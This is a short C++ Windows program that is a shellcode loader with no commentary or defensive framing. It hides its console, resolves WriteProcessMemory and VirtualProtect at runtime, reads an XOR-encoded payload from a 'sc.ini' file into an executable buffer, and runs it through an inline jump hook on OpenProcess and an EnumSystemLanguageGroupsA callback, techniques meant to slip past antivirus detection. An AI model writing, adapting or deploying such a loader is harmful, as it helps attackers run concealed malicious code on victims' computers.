#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup" )
#define _CRT_SECURE_NO_DEPRECATE
#include <Windows.h>
#include <iostream>

using namespace std;

typedef BOOL(WINAPI* Write)(
	HANDLE		hprocess,
	LPVOID		BaseAddr,
	LPCVOID		BUffer,
	SIZE_T		Size,
	SIZE_T*		NumberOfBytes
	);
Write Writer = (Write)GetProcAddress(
	GetModuleHandleA("Kernel32.dll"),
	"WriteProcessMemory"
);

typedef BOOL(WINAPI* vp)(
	LPVOID		Address,
	DWORD		size,
	DWORD		New,
	PDWORD		Old
	);
vp vip = (vp)GetProcAddress(
	GetModuleHandleA("Kernel32.dll"),
	"VirtualProtect"
);

class InLine {

private:
	BYTE Newbyte[5] = "0";
	PROC FuncAddr;
	PROC hookFunc;
public:
	InLine(PROC Func);
};

InLine::InLine(PROC Func) {
	FuncAddr = Func;
	if (FuncAddr == NULL) {
		exit(1);
	}
	hookFunc = GetProcAddress(
		GetModuleHandleA("Kernel32.dll"),
		"OpenProcess"
	);
	if (hookFunc == NULL) {
		exit(1);
	}
	SIZE_T d;
	Newbyte[0] = '\xE9';
	*(DWORD*)(Newbyte + 1) = (DWORD)FuncAddr - (DWORD)hookFunc - 5;

	Writer(GetCurrentProcess(), hookFunc, Newbyte, 5, &d);

	EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)hookFunc, LGRPID_INSTALLED, NULL);
}


int main() {
	cout << 123;
	char path[MAX_PATH];
	char abc[3000];
	unsigned char cba[3000];
	DWORD d;
	vip(cba, sizeof(cba), PAGE_EXECUTE_READWRITE, &d);

	GetCurrentDirectoryA(MAX_PATH, path);
	
	strcat(path, "\\sc.ini");

	for (int i = 0; i < 3000; i++) {
		_itoa_s(i, abc, 10);
		UINT ok = GetPrivateProfileIntA("key", abc, NULL, path);
		if (ok == 0) {
			break;
		}
		cba[i] = ok^1024;
	}
	InLine I((PROC)&cba);
	return 0;
}